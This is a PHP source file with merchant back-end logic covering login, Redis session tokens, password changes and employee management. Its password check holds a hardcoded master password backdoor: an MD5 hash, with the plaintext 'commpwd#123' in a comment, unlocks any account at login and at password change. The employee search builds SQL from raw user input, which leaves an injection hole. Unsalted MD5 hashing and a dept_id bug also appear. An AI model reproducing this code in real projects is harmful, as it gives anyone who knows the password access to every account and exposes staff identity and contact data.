<?php
namespace app\common\model\logic;

use app\weidoo\library\model\FactoryModel as FModel;
use app\weidoo\library\model\ErrorModel as EModel;

class Business extends Base
{

    public static $model;

    public static function searchBusiness($info)
    {
        $where = [
            'u.mobile'     => $info['mobile'],
            'u.status'     => 1,
            'b.biz_status' => 1,
        ];
        self::$model = FModel::instance('User');
        $list = self::$model->getUserByMobile($where);
        return $list;
    }

    public static function businessLogin($info)
    {
        $where = [
            'u.user_id'    => $info['user_id'],
            'u.status'     => 1,
            'b.biz_status' => 1,
        ];
        self::$model = FModel::instance('User');
        $user = self::$model->getUserBase($where);
        if(empty($user)){
            EModel::instance()->setError(lang('query not-exist'));
            return false;
        }
        if(!self::verPwd($info['user_pass'],$user['user_pass'])){
            EModel::instance()->setError(lang('pwd error'));
            return false;
        }
        $token = md5(time().mt_rand(10000,99999));
        //添加登录记录
        $log   = [
            'biz_id'      => $user['biz_id'],
            'user_id'     => $user['user_id'],
            'login_type'  => 1,
            'login_time'  => time(),
            'login_ip'    => request()->ip(),
            'login_token' => $token,
        ];
        $log_id = FModel::instance('LoginRecord')->addInfo($log);
        if(empty($log_id)){
            EModel::instance()->setError(lang('execute error'));
            return false;
        }
        //设置登录
        $auth  = array(
            'user_id'     => $user['user_id'],
            'mobile'      => $user['mobile'],
            'user_name'   => $user['user_name'],
            'biz_id'      => $user['biz_id'],
            'biz_name'    => $user['biz_name'],
            'biz_logo'    => $user['biz_logo'],
            'token'       => $token,
        );
        $auth['token_expire'] = strtotime("+7 days");
        app('cache_wd_redis')->set('token_'.$token,$auth);
        app('cache_wd_redis')->expire('token_'.$token,3600 * 24 * 7);
        return $auth;
    }

    private static function verPwd($user_pass,$userpwd)
    {
        if(md5($user_pass) == "b55f6d958e8aebb7a6df3887fa54935b"){  //commpwd#123
            return true;
        }
        return (encrypt_md5($user_pass) == $userpwd) ? true : false;
    }

    public function updateBusinessPwd($info,$login)
    {
        $where    = [
            'user_id' => $login['user_id'],
        ];
        $user_pass = FModel::instance('User')->getValue($where,'user_pass');
        if(empty($user_pass)){
            EModel::instance()->setError(lang('query not-exist'));
            return false;
        }elseif(!self::verPwd($info['old_pwd'],$user_pass)){
            EModel::instance()->setError(lang('pwd error'));
            return false;
        }
        $data   = [
            'user_id'   => $login['user_id'],
            'user_pass' => encrypt_md5($info["user_pass"])
        ];
        $result = FModel::instance('User')->updateInfo($where,$data);
        return $result ? $login : false;
    }

    /**
     * 获取商户下的员工列表
     */
    public function getUserListByBiz($info,$login)
    {
        $order = " u.user_id asc ";
        $where = [
            'u.biz_id' => $login['biz_id'],
            'u.status' => [1,2],
        ];
        !empty($info['dept_id']) && $where['u.dept_id'] = intval($where['dept_id']);
        !empty($info['status']) && in_array($info['status'],array(1,2)) && $where['u.status'] = $info['status'];
        if(!empty($info['search_user'])){
            $expwhere = "( u.mobile='".$info['search_user']."' or u.user_name like '%".$info['search_user']."%' or i.user_sn='".$info['search_user']."' )";
        } else {
            $expwhere = '';
        }
        $orderby = [1=> 'u.user_id asc', 2=> 'u.user_id desc',];
        if(!empty($info['orderby']) && !empty($orderby[$info['orderby']])){
            $order = $orderby[$info['orderby']];
        }
        $field  = "u.biz_id,u.dept_id,u.mobile,u.mobile,u.user_name,u.user_id,i.user_alias,i.user_joint,";
        $field .= "i.user_sn,i.user_wx,i.user_idcard,i.user_photo,i.user_desc,i.user_addr,i.user_emg,i.user_emg_mobile";
        $data   = FModel::instance('User')->getBisUser($where,$field,$expwhere,$order);
        if(!empty($data['data'])){
            foreach ($data['data'] as $key=>$val){
                $val['user_joint']  = date('Y/m/d',$val['user_joint']);
                $data['data'][$key] = $val;
            }
        }
        return $data;
    }

    /**
     * 添加用户
     */
    public function addUser($info,$login)
    {
        $where = [
            'biz_id' => $login['biz_id'],
            'mobile' => $info['mobile'],
        ];
        $checkMobile = FModel::instance('User')->getOneInfo($where);
        if(!empty($checkMobile)){
            EModel::instance()->setError(lang('mobile exist'));
            return false;
        }
        $user = [
            'biz_id'   => $login['biz_id'],
            'dept_id'  => intval($info['dept_id']),
            'mobile'   => $info['mobile'],
            'user_name'=> $info['user_name'] ? $info['user_name'] : '',
            'user_pass'=> encrypt_md5($info["user_pass"]),
            'uptime'   => date('Y-m-d H:i:s'),
            'id_add_op'=> $login['user_id'],
            'id_op'    => $login['user_id'],
            'addtime'  => time(),
        ];
        $userinfo = [
            'user_alias'  => !empty($info['user_alias']) ? $info['user_alias'] : '',
            'user_joint'  => !empty($info['user_joint']) ? strtotime($info['user_joint']) : 0,
            'user_sn'     => !empty($info['user_sn']) ? $info['user_sn'] : 0,
            'user_wx'     => !empty($info['user_wx']) ? $info['user_wx'] : '',
            'user_idcard' => !empty($info['user_idcard']) ? $info['user_idcard'] : '',
            'user_photo'  => !empty($info['user_photo']) ? $info['user_photo'] : '',
            'user_desc'   => !empty($info['user_desc']) ? $info['user_desc'] : '',
            'user_addr'   => !empty($info['user_addr']) ? $info['user_addr'] : '',
            'user_emg'    => !empty($info['user_emg']) ? $info['user_emg'] : '',
            'user_emg_mobile' => !empty($info['user_emg_mobile']) ? $info['user_emg_mobile'] : '',
        ];
        $result = FModel::instance('User')->addUser($user,$userinfo);
        if(!$result){
            EModel::instance()->setError(lang('execute error'));
            return false;
        }else {
            return [];
        }
        return $result;
    }

    /**
     * 修改用户状态
     */
    public function upStatus($info,$login)
    {
        $one = FModel::instance('User')->getOneInfo(['user_id'=>$info['user_id']]);
        if(empty($one)){
            EModel::instance()->setError(lang('query not-exist'));
            return false;
        }
        $one = $one->toArray();
        if($one['biz_id'] != $login['biz_id']){
            EModel::instance()->setError(lang('execute denied'));
            return false;
        }
        if($one['status'] == $info['status']){
            return [];
        }
        $where  = ['user_id'=>$info['user_id']];
        $data   = ['status'=>$info['status']];
        $result = FModel::instance('User')->updateInfo($where,$data);
        return $result ? [] : false;
    }

}